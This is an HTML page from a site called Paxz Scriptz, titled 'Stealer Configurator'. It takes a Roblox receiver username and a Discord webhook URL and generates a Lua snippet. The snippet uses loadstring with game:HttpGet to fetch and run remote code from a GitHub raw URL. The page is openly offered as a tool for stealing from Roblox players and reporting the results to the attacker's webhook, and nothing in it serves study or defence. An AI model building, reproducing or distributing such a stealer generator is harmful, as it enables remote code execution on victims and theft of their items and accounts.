<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stealer Configurator | Paxz Scriptz</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --bg: #050505; --card: #0f0f0f; --accent: #8a2be2; --text: #ffffff; --text-dim: #a0a0a0; }
        body { background: linear-gradient(-45deg, #050505, #0a0a0a, #1a0b2e, #050505); background-size: 400% 400%; animation: bgShift 25s ease infinite; color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; height: 100vh; overflow: hidden; }
        
        nav { display: flex; justify-content: space-between; padding: 15px 8%; background: rgba(0,0,0,0.9); border-bottom: 1px solid #1a1a1a; }
        .logo { font-size: 22px; font-weight: 800; text-decoration: none; color: white; text-transform: uppercase; transition: all 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94); text-shadow: 0 0 5px rgba(138, 43, 226, 0.3); }
        .logo:hover { transform: scale(1.05); text-shadow: 0 0 10px rgba(138, 43, 226, 0.5); }
        .logo span { color: var(--accent); transition: all 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94); animation: glow 3s ease-in-out infinite; }
        .logo span { color: var(--accent); transition: all 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94); animation: glow 3s ease-in-out infinite; }

        .container { max-width: 700px; margin: 30px auto; padding: 0 20px; }
        .config-wrapper { background: var(--card); padding: 30px; border-radius: 12px; border: 1px solid #1a1a1a; box-shadow: 0 0 30px rgba(0,0,0,0.5); }

        .input-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 8px; color: var(--text-dim); font-size: 12px; font-weight: 600; text-transform: uppercase; }
        label i { margin-right: 5px; color: var(--accent); }
        input { width: 100%; padding: 12px; background: #000; border: 1px solid #222; border-radius: 6px; color: white; font-size: 14px; transition: all 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94); box-sizing: border-box; }
        input:focus { border-color: var(--accent); outline: none; box-shadow: 0 0 0 2px rgba(138, 43, 226, 0.3); }

        .btn-gen { width: 100%; background: var(--accent); color: white; padding: 14px; border-radius: 6px; font-weight: 800; border: none; cursor: pointer; font-size: 15px; text-transform: uppercase; transition: all 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94); }
        .btn-gen:hover { transform: translateY(-2px) scale(1.05); box-shadow: 0 5px 15px rgba(138, 43, 226, 0.3); }
        
        #result-section { margin-top: 20px; display: none; }
        .code-box { background: #000; border: 1px solid var(--accent); border-radius: 6px; position: relative; }
        textarea { width: 100%; height: 100px; background: transparent; color: #bbb; padding: 15px; border: none; font-family: 'Consolas', monospace; font-size: 12px; resize: none; outline: none; box-sizing: border-box; }
        .copy-btn { position: absolute; top: 8px; right: 8px; background: #1a1a1a; color: white; border: 1px solid #333; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 10px; transition: all 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94); }
        .copy-btn:hover { background: #333; }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes bgShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        @keyframes glow {
            0% { text-shadow: 0 0 5px rgba(138, 43, 226, 0.3); }
            50% { text-shadow: 0 0 20px rgba(138, 43, 226, 0.8); }
            100% { text-shadow: 0 0 5px rgba(138, 43, 226, 0.3); }
        }
    </style>
</head>
<body>
    <nav>
        <a href="index.html" class="logo">Paxz<span>Scriptz</span></a>
        <div style="font-size: 12px;"><a href="scripts.html" style="color: var(--text-dim); text-decoration: none;"><i class="fas fa-arrow-left"></i> BACK</a></div>
    </nav>

    <div class="container">
        <div class="config-wrapper">
            <h3 style="margin-top: 0; margin-bottom: 20px; font-size: 1.2rem; animation: fadeIn 1s ease; text-shadow: 0 0 10px rgba(138, 43, 226, 0.3);"><i class="fas fa-cog"></i> Stealer Configurator</h3>
            
            <div class="input-group">
                <label><i class="fas fa-user"></i> Receiver Username</label>
                <input type="text" id="val1" placeholder="Roblox Username">
            </div>
            <div class="input-group">
                <label><i class="fas fa-link"></i> Webhook URL</label>
                <input type="text" id="val2" placeholder="Discord Webhook Link">
            </div>

            <button class="btn-gen" onclick="generateCode()">Generate Code</button>

            <div id="result-section">
                <div class="code-box">
                    <button class="copy-btn" onclick="copyToClipboard()">COPY</button>
                    <textarea id="output-code" readonly></textarea>
                </div>
            </div>
        </div>
    </div>

    <script>
        function generateCode() {
            const v1 = document.getElementById('val1').value;
            const v2 = document.getElementById('val2').value;
            let code = `_G.username = "${v1}"\n_G.webhook = "${v2}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/deltamokey-arch/PaxzScriptz/refs/heads/main/Main'))()`;
            document.getElementById('output-code').value = code;
            document.getElementById('result-section').style.display = 'block';
        }

        function copyToClipboard() {
            const c = document.getElementById("output-code"); 
            c.select(); 
            document.execCommand("copy"); 
            alert("Copied!");
        }
    </script>
</body>
</html>
